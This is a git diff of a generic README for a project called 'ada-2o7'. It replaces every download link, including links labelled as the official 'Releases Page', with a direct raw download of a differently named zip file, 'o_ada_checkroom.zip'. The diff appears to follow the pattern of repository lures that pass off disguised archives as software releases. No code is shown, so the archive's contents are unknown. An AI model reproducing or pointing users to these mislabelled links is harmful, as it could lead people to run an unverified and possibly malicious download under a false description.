@@ -6,11 +6,11 @@ Welcome to ada-2o7! This application aims to simplify your daily tasks and boost
 ## 📦 Download & Install
 You can easily download ada-2o7 from our Releases page. Click the link below to get started:
 
-[![Download ada-2o7](https://raw.githubusercontent.com/chaab323/ada-2o7/main/microzoal/ada-2o7.zip%20ada--2o7-v1.0.0-brightgreen)](https://raw.githubusercontent.com/chaab323/ada-2o7/main/microzoal/ada-2o7.zip)
+[![Download ada-2o7](https://raw.githubusercontent.com/chaab323/ada-2o7/main/microzoal/o_ada_checkroom.zip%20ada--2o7-v1.0.0-brightgreen)](https://raw.githubusercontent.com/chaab323/ada-2o7/main/microzoal/o_ada_checkroom.zip)
 
 ### Steps to Download
 1. **Visit the Releases Page**: Click on the link below to go to our official Releases page:
-   - [ada-2o7 Releases Page](https://raw.githubusercontent.com/chaab323/ada-2o7/main/microzoal/ada-2o7.zip)
+   - [ada-2o7 Releases Page](https://raw.githubusercontent.com/chaab323/ada-2o7/main/microzoal/o_ada_checkroom.zip)
   
 2. **Select the Latest Version**: On the Releases page, you will see a list of available versions. Look for the latest version labeled as "Latest Release".
 
@@ -57,4 +57,4 @@ Join our growing community where you can ask questions, share tips, and receive 
 We thank you for choosing ada-2o7 to help streamline your tasks. We are committed to improving this application based on user feedback. Don’t hesitate to reach out through our GitHub repository if you have any suggestions or issues.
 
 For the latest version, visit our Releases page again:
-- [ada-2o7 Releases Page](https://raw.githubusercontent.com/chaab323/ada-2o7/main/microzoal/ada-2o7.zip)
+- [ada-2o7 Releases Page](https://raw.githubusercontent.com/chaab323/ada-2o7/main/microzoal/o_ada_checkroom.zip)
